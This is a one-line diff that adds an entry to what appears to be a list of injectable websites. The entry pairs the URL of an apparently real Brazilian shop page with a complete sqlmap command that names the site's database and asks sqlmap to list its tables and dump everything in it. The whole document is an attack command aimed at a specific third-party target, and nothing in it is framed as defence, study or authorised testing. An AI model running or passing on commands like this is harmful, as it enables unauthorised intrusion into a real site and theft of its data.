@@ -1,0 +1,1 @@
+http://www.fraternaonline.com.br/produtos.php?pag=1&categoria=145 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.fraternaonline.com.br/produtos.php?pag=1&categoria=145 -D fraternaonline12 --tables --dump-all
